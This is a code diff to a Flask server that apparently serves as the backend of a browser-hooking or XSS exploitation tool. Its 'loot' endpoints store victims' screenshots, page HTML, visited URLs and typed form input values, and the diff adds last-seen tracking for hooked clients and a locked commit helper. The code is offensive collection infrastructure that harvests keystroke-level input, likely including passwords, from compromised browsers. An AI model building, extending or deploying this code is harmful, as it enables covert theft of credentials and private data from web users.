@@ -80,6 +80,9 @@ class Client(db.Model):
     firstSeen = db.Column(db.DateTime(timezone=True),server_default=func.now())
     lastSeen  = db.Column(db.DateTime(timezone=True), onupdate=func.now())
 
+    def update(self):
+        self.lastSeen = func.now()
+
     def __repr__(self):
         return f'<Client {self.id}>'
 
@@ -237,6 +240,28 @@ def findLootDirectory(identifier):
 
 
 
+def dbCommit():
+    databaseLock.acquire()
+    db.session.commit()
+    databaseLock.release()
+
+
+
+# Updates "last seen" timestamp"
+def clientSeen(identifier):
+    # print("Searching db for identifier: " + identifier)
+    # clients = Client.query.all()
+    # numClients = len(clients)
+    # print("++ Num clients in DB is: " + str(numClients))
+
+    # for client in clients:
+    #     print("Client id: " + str(client.id) + ", nickname: " + client.nickname)
+    client = Client.query.filter_by(nickname=identifier).first()
+    print("** in clientSeen func, clientID: " + str(client.id) + ", nickname: " + client.nickname)
+    client.update()
+
+
+
 
 #***************************************************************************
 # API Endpoints
@@ -263,6 +288,8 @@ def sendHtml2Canvas():
         return response
 
 
+
+# Loot API endpoints
 
 # Capture screenshot
 @app.route('/loot/screenshot/<identifier>', methods=['POST'])
@@ -314,11 +341,9 @@ def recordHTML(identifier):
 
 
     # Put it in the DB
-    databaseLock.acquire()
     newHtml = HtmlCode(clientID=identifier, url=content['url'], code=content['html'])
     db.session.add(newHtml)
-    db.session.commit()
-    databaseLock.release()
+    dbCommit()
 
     return "ok", 200
 
@@ -337,12 +362,9 @@ def recordUrl(identifier):
 
 
     # Put it in the DB
-    databaseLock.acquire()
     newUrl = UrlVisited(clientID=identifier, url=content['url'])
     db.session.add(newUrl)
-    db.session.commit()
-    databaseLock.release()
-
+    dbCommit()
 
     return "ok", 200
 
@@ -362,12 +384,10 @@ def recordInput(identifier):
 
 
     # Put it in the DB
-    databaseLock.acquire()
     newInput = UserInput(clientID=identifier, inputName=content['inputName'], inputValue=content['inputValue'])
     db.session.add(newInput)
-    db.session.commit()
-    databaseLock.release()
-
+    clientSeen(identifier)
+    dbCommit()
 
     return "ok", 200
 
